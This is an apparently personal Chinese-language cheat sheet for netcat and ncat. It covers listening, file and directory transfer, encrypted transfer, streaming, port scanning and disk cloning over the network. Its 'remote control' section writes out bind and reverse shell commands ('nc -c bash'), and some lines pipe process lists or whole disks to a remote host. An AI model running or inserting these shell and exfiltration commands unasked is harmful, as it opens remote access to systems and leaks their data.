
# netcat

* netcat
* ncat

## netcat

* 描述
> 网络工具中的瑞士军刀——小身材、大智慧  
  侦听模式 / 传输模式  
  telnet / 获取banner信息  
  传输文本信息  
  传输文件/目录  
  加密传输文件  
  远程控制/木马  
  加密所有流量  
  流媒体服务器  
  远程克隆硬盘  

* 连接服务器
``` 
nc -vn 1.1.1.1 110
```

* 开启服务器监听
``` 
nc -l -p 4444

nc -l -p 4444 > ps.txt
ps aux | nc -nv 1.1.1.1 110 
```
* 传输文件
``` 
nc -lp 333 > 1.mp4
nc -nv 1.1.1.1 333 < 1.mp4 -q 1

nc -q 1 -lp 333 < a.mp4
nc -nv 1.1.1.1 333 > 2.mp4
```
* 传输目录
``` 
tar -cvf - music/ | nc lp 333 -q 1
nc -nv 1.1.1.1 333 | tar -xvf -
```

* 加密传文件
``` 
nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb > 1.mp4
mcrypt --flush -Fbq -a rijndael-256 -m ecb < a.mp4 | nc -nv 1.1.1.1 333 -q 1
```
* 流媒体
``` 
cat 1.mp4 | nc -lp 333
nc -nv 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -
```
* 扫描端口
``` 
nc -nvz 1.1.1.1 1-65535
nc -vnzu 1.1.1.1 1-1024
```

* 克隆硬盘
``` 
nc -lp 333 | dd of=/dev/sda
dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1
```
* 远程控制
``` 
正向
    服务器：nc -lp 333 -c bash
    客户端：nc -nv 1.1.1.1 333
		
反向
    客户端：nc -lp 333
    服务器端：nc -nv 1.1.1.1 333 -c bash

注：windows 用户把bash改成cmd
```


## ncat
> nc缺乏加密和身份验证能力  
> 包含于nmap工具包
```
ncat -c bash --allow 192.168.20.14 -vnl 333 --ssl
ncat -nv 1.1.1.1 333 --ssl
```
